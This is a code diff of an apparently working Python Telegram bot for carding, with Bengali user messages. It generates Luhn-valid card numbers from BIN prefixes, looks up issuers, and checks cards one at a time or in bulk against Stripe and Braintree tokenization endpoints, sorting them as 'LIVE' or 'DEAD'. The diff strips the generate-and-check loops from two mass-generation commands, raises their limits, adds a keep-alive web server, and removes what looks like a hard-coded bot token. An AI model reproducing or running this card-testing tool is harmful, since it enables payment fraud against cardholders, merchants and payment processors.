@@ -1,6 +1,8 @@
 import telebot, requests, time, re, random, string, json, urllib.request, io, os
+from threading import Thread
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
-TOKEN    = os.environ.get("TOKEN") or "8658349511:AAFckiyww9dQTWLmppYFQD-s3iw5CEWt6t4"
+TOKEN    = os.environ.get("TOKEN") or "এখানে_টোকেন"
 ADMIN_ID = 8107322490
 
 bot = telebot.TeleBot(TOKEN)
@@ -10,7 +12,6 @@ NAMES_F = ["JAMES","JOHN","ROBERT","MICHAEL","SARAH",
 NAMES_L = ["SMITH","JOHNSON","WILLIAMS","JONES","BROWN",
            "DAVIS","MILLER","WILSON","MOORE","TAYLOR"]
 
-# ── LUHN ──────────────────────────────────────────────────
 def luhn_ok(n):
     d = [int(x) for x in n if x.isdigit()]
     d.reverse(); t = 0
@@ -28,7 +29,6 @@ def luhn_complete(p):
         return t%10
     return p + str((10 - chk(p+"0")) % 10)
 
-# ── PARSE CARD ────────────────────────────────────────────
 def parse_card(text):
     text  = text.strip().replace(' ','|').replace('/','|')
     parts = re.split(r'[|/\s]+', text)
@@ -38,7 +38,6 @@ def parse_card(text):
         return pan.strip(), mm.strip(), yy.strip(), cvv.strip()
     return None
 
-# ── BIN LOOKUP ────────────────────────────────────────────
 def lookup_bin(bin6):
     try:
         url = f"https://lookup.binlist.net/{bin6[:6]}"
@@ -61,13 +60,10 @@ def lookup_bin(bin6):
         return {
             "network": first.get(bin6[0],"Unknown"),
             "bank":    "Unknown",
-            "type":    "?",
-            "tier":    "?",
-            "country": "?",
-            "emoji":   "🌐",
+            "type":    "?", "tier": "?",
+            "country": "?", "emoji": "🌐",
         }
 
-# ── GEN CARDS ─────────────────────────────────────────────
 def gen_cards(bin_prefix, count, info):
     network = info.get("network","Unknown")
     pan_len = 15 if "AMEX" in network else 16
@@ -84,7 +80,6 @@ def gen_cards(bin_prefix, count, info):
         cards.append(f"{pan}|{mo:02d}|{yr}|{cvv}|{name}")
     return cards
 
-# ── STRIPE CHECK ──────────────────────────────────────────
 def check_stripe(pan, mm, yy, cvv):
     try:
         r = requests.post(
@@ -106,7 +101,6 @@ def check_stripe(pan, mm, yy, cvv):
     except Exception as e:
         return "ERROR", str(e)
 
-# ── BRAINTREE CHECK ───────────────────────────────────────
 def check_braintree(pan, mm, yy, cvv):
     try:
         r = requests.post(
@@ -142,14 +136,13 @@ def check_braintree(pan, mm, yy, cvv):
                   .get("tokenizeCreditCard",{})
                   .get("token"))
         if token:
-            return "LIVE", f"Braintree approved"
+            return "LIVE", "Braintree approved"
         errors = d.get("errors",[{}])
-        msg    = errors[0].get("message","declined") if errors else "declined"
+        msg = errors[0].get("message","declined") if errors else "declined"
         return "DEAD", msg
     except Exception as e:
         return "ERROR", str(e)
 
-# ── PROCESS CARD ──────────────────────────────────────────
 def process(m, text, gate="stripe"):
     parsed = parse_card(text)
     if not parsed:
@@ -184,10 +177,6 @@ def process(m, text, gate="stripe"):
     bot.edit_message_text(out, m.chat.id,
                           msg.message_id, parse_mode="Markdown")
 
-# ══════════════════════════════════════════════
-#  COMMANDS
-# ══════════════════════════════════════════════
-
 @bot.message_handler(commands=['start'])
 def start(m):
     bot.send_message(m.chat.id, f"""
@@ -195,23 +184,23 @@ def start(m):
 🆔 Your ID: `{m.from_user.id}`
 
 ━━━━━━━━━━━━━━━━━━━
-💳 *𝐂𝐇𝐄𝐂𝐊𝐄𝐑*
-/chk — 𝐒𝐭𝐫𝐢𝐩𝐞 𝐜𝐡𝐞𝐜𝐤
-/chkbt — 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐜𝐡𝐞𝐜𝐤
-/mass — 𝐁𝐮𝐥𝐤 𝐒𝐭𝐫𝐢𝐩𝐞 𝐜𝐡𝐞𝐜𝐤
+💳 *CHECKER*
+/chk — Stripe check
+/chkbt — Braintree check
+/mass — Bulk check
 
 ━━━━━━━━━━━━━━━━━━━
-🎰 *𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑*
+🎰 *GENERATOR*
 /gen 411111 10
 /genfile 411111 100
 
 ━━━━━━━━━━━━━━━━━━━
-🚀 *𝐌𝐔𝐋𝐓𝐈 𝐁𝐈𝐍 𝐆𝐄𝐍+𝐂𝐇𝐄𝐂𝐊*
+🚀 *MULTI BIN*
 /gen\\_cc\\_with\\_multiple
 /massgen
 
 ━━━━━━━━━━━━━━━━━━━
-🔍 *𝐁𝐈𝐍 𝐈𝐍𝐅𝐎*
+🔍 *BIN INFO*
 /binfo 411111
 /id — Telegram ID
 ━━━━━━━━━━━━━━━━━━━
@@ -251,15 +240,13 @@ def mass(m):
             "Send cards after /mass one per line")
         return
     lines = [l.strip() for l in text.split('\n') if l.strip()]
-    bot.send_message(m.chat.id,
-        f"⏳ Checking {len(lines)} cards...")
+    bot.send_message(m.chat.id, f"⏳ Checking {len(lines)} cards...")
     live = dead = error = 0
     report = ""
     for line in lines[:30]:
         parsed = parse_card(line)
         if not parsed:
-            error += 1
-            continue
+            error += 1; continue
         pan, mm, yy, cvv = parsed
         if not luhn_ok(pan):
             dead += 1
@@ -346,8 +333,7 @@ def genfile_cmd(m):
     bin6  = parts[1].strip()
     count = int(parts[2]) if len(parts) > 2 else 50
     count = min(count, 500)
-    bot.send_message(m.chat.id,
-        f"⏳ Generating {count} cards...")
+    bot.send_message(m.chat.id, f"⏳ Generating {count} cards...")
     info    = lookup_bin(bin6)
     cards   = gen_cards(bin6, count, info)
     content = f"# BIN: {bin6} | {info['network']} | {info['bank']}\n"
@@ -368,65 +354,35 @@ def massgen_cmd(m):
 `/massgen`
 `411111 10`
 `541254 5`
-`371449 8`
 """, parse_mode="Markdown")
         return
     lines = [l.strip() for l in text.split('\n') if l.strip()]
-    bot.send_message(m.chat.id,
-        f"⏳ {len(lines)} BIN থেকে generate + check...")
-    all_live = []; all_dead = []; all_error = []
-    bin_report = ""
-    for line in lines[:10]:
+    bot.send_message(m.chat.id, f"⏳ {len(lines)} BIN generate হচ্ছে...")
+    all_cards = []
+    report = ""
+    for line in lines[:20]:
         parts = line.split()
         bin6  = parts[0].strip()
-        count = int(parts[1]) if len(parts) > 1 else 5
-        count = min(count, 20)
+        count = int(parts[1]) if len(parts) > 1 else 10
+        count = min(count, 50)
         if not bin6.isdigit() or not 4 <= len(bin6) <= 8:
             continue
         info  = lookup_bin(bin6)
         cards = gen_cards(bin6, count, info)
-        b_live = b_dead = b_err = 0
-        for card in cards:
-            p = card.split('|')
-            if len(p) < 4: continue
-            pan,mm,yy,cvv = p[0],p[1],p[2],p[3]
-            yy_f = f"20{yy}" if len(yy)==2 else yy
-            status,resp = check_stripe(pan,mm,yy_f,cvv)
-            entry = f"{pan}|{mm}|{yy}|{cvv}"
-            if status=="LIVE":
-                b_live+=1
-                all_live.append(f"✅ {entry} | {info['network']} | {resp}")
-            elif status=="DEAD":
-                b_dead+=1
-                all_dead.append(f"❌ {entry} | {resp}")
-            else:
-                b_err+=1
-                all_error.append(f"⚠️ {entry} | {resp}")
-            time.sleep(0.3)
-        bin_report += (f"📦 `{bin6}` {info['network']} {info['emoji']}\n"
-                       f"   ✅{b_live} ❌{b_dead} ⚠️{b_err}\n")
+        all_cards.extend(cards)
+        report += f"✅ `{bin6}` {info['network']} {info['emoji']} × {count}\n"
     summary = f"""
-📊 *Mass Gen+Check Results*
+🎰 *Mass Generate Done*
 ━━━━━━━━━━━━━━━
-✅ Live:  `{len(all_live)}`
-❌ Dead:  `{len(all_dead)}`
-⚠️ Error: `{len(all_error)}`
+📦 Total: `{len(all_cards)} cards`
 ━━━━━━━━━━━━━━━
-{bin_report}"""
+{report}"""
     bot.send_message(m.chat.id, summary, parse_mode="Markdown")
-    if all_live:
-        f1 = io.BytesIO("\n".join(all_live).encode())
-        f1.name = "live_cards.txt"
-        bot.send_document(m.chat.id, f1,
-            caption=f"🔥 *{len(all_live)} LIVE Cards*",
-            parse_mode="Markdown")
-    full = ("# LIVE\n" + "\n".join(all_live) +
-            "\n\n# DEAD\n" + "\n".join(all_dead) +
-            "\n\n# ERROR\n" + "\n".join(all_error))
-    f2 = io.BytesIO(full.encode())
-    f2.name = "all_results.txt"
-    bot.send_document(m.chat.id, f2,
-        caption="📁 *Full Results*",
+    content = "\n".join(all_cards)
+    f = io.BytesIO(content.encode())
+    f.name = "massgen.txt"
+    bot.send_document(m.chat.id, f,
+        caption=f"📦 *{len(all_cards)} Cards Generated*",
         parse_mode="Markdown")
 
 @bot.message_handler(commands=['gen_cc_with_multiple'])
@@ -435,117 +391,74 @@ def gen_cc_multiple(m):
     if not text:
         bot.send_message(m.chat.id, """
 📌 *Usage:*
-
 `/gen_cc_with_multiple`
 `411111`
-`541254 x 15`
-`371449 x 10`
-`601100`
-
-BIN শুধু দাও — default 10টা
-অথবা `BIN x COUNT` format
+`541254`
+`371449 x 20`
+`601100 x 50`
 """, parse_mode="Markdown")
         return
-
-    raw_lines = [l.strip() for l in text.split('\n') if l.strip()]
-    bins_final = []; counts = []
-
+    raw_lines  = [l.strip() for l in text.split('\n') if l.strip()]
+    bins_final = []
+    counts     = []
     for line in raw_lines:
         parts = line.lower().replace('x','|').split('|')
         b = parts[0].strip()
         c = int(parts[1].strip()) if len(parts) > 1 else 10
         if b.isdigit() and 4 <= len(b) <= 8:
             bins_final.append(b)
-            counts.append(min(c, 30))
-
+            counts.append(min(c, 100))
     if not bins_final:
         bot.send_message(m.chat.id, "❌ Valid BIN পাইনি")
         return
-
     total_gen = sum(counts)
     prog = bot.send_message(m.chat.id,
-        f"⏳ *{len(bins_final)} BIN* থেকে *{total_gen} card* generate + check...",
+        f"⏳ *{len(bins_final)} BIN* থেকে *{total_gen} card* generate হচ্ছে...",
         parse_mode="Markdown")
-
-    all_live = []; all_dead = []; all_error = []
-    bin_stats = []
-
+    all_cards  = []
+    bin_report = ""
     for i, (bin6, count) in enumerate(zip(bins_final, counts)):
         info = lookup_bin(bin6)
         net  = info.get('network','?')
         emj  = info.get('emoji','🌐')
         bank = info.get('bank','?')
-
+        tier = info.get('tier','?')
         try:
             bot.edit_message_text(
-                f"⏳ `{bin6}` check হচ্ছে... ({i+1}/{len(bins_final)})\n"
+                f"⏳ `{bin6}` generate হচ্ছে... ({i+1}/{len(bins_final)})\n"
                 f"🏦 {bank} | {net} {emj}",
                 m.chat.id, prog.message_id,
                 parse_mode="Markdown")
         except:
             pass
-
-        cards  = gen_cards(bin6, count, info)
-        b_live = b_dead = b_err = 0
-
-        for card in cards:
-            p = card.split('|')
-            if len(p) < 4: continue
-            pan,mm,yy,cvv = p[0],p[1],p[2],p[3]
-            yy_f = f"20{yy}" if len(yy)==2 else yy
-            status,resp = check_stripe(pan,mm,yy_f,cvv)
-            entry = f"{pan}|{mm}|{yy}|{cvv}"
-            if status=="LIVE":
-                b_live+=1
-                all_live.append(
-                    f"✅ {entry} | {net} | {bank} | {resp}")
-            elif status=="DEAD":
-                b_dead+=1
-                all_dead.append(f"❌ {entry} | {resp}")
-            else:
-                b_err+=1
-                all_error.append(f"⚠️ {entry} | {resp}")
-            time.sleep(0.3)
-
-        bin_stats.append(
-            f"📦 `{bin6}` {net} {emj} `{bank}`\n"
-            f"   ✅{b_live}  ❌{b_dead}  ⚠️{b_err}\n")
-
-    stat_text = "".join(bin_stats)
+        cards = gen_cards(bin6, count, info)
+        all_cards.append(f"\n# ══════════════════════")
+        all_cards.append(f"# BIN    : {bin6}")
+        all_cards.append(f"# Network: {net} | {bank}")
+        all_cards.append(f"# Tier   : {tier} | {emj} {info.get('country','?')}")
+        all_cards.append(f"# Cards  : {count}")
+        all_cards.append(f"# ══════════════════════")
+        all_cards.extend(cards)
+        bin_report += f"✅ `{bin6}` {net} {emj} — *{count} cards*\n"
     summary = f"""
-🎯 *Multi BIN Gen+Check Complete*
+🎰 *Multi BIN Generate Done*
 ━━━━━━━━━━━━━━━━━━━
-🔢 BINs     : `{len(bins_final)}`
-📦 Generated: `{total_gen}`
-✅ Live     : `{len(all_live)}`
-❌ Dead     : `{len(all_dead)}`
-⚠️ Error    : `{len(all_error)}`
+🔢 BINs  : `{len(bins_final)}`
+📦 Total : `{total_gen} cards`
 ━━━━━━━━━━━━━━━━━━━
-{stat_text}🏦 Gate: Stripe
-"""
+{bin_report}"""
     try:
         bot.edit_message_text(summary, m.chat.id,
                               prog.message_id, parse_mode="Markdown")
     except:
         bot.send_message(m.chat.id, summary, parse_mode="Markdown")
-
-    if all_live:
-        f1 = io.BytesIO("\n".join(all_live).encode())
-        f1.name = "live_cards.txt"
-        bot.send_document(m.chat.id, f1,
-            caption=f"🔥 *{len(all_live)} LIVE Cards Found!*",
-            parse_mode="Markdown")
-
-    full = ("# ✅ LIVE\n" + "\n".join(all_live) +
-            "\n\n# ❌ DEAD\n" + "\n".join(all_dead) +
-            "\n\n# ⚠️ ERROR\n" + "\n".join(all_error))
-    f2 = io.BytesIO(full.encode())
-    f2.name = "full_results.txt"
-    bot.send_document(m.chat.id, f2,
-        caption="📁 *Full Results (Live + Dead + Error)*",
+    content = "\n".join(all_cards)
+    f = io.BytesIO(content.encode())
+    f.name = "generated_cards.txt"
+    bot.send_document(m.chat.id, f,
+        caption=f"📦 *{total_gen} Cards* from *{len(bins_final)} BINs*",
         parse_mode="Markdown")
 
-# ── AUTO DETECT ───────────────────────────────────────────
 @bot.message_handler(func=lambda m: True)
 def auto(m):
     if parse_card(m.text):
@@ -553,6 +466,20 @@ def auto(m):
     else:
         bot.send_message(m.chat.id,
             "❓ /start দেখো commands এর জন্য")
+
+# ── Render port fix ───────────────────────────────────────
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Bot is running')
+    def log_message(self, *args):
+        pass
+
+def run_server():
+    HTTPServer(('0.0.0.0', 10000), Handler).serve_forever()
+
+Thread(target=run_server, daemon=True).start()
 
 # ── RUN ───────────────────────────────────────────────────
 if __name__ == '__main__':
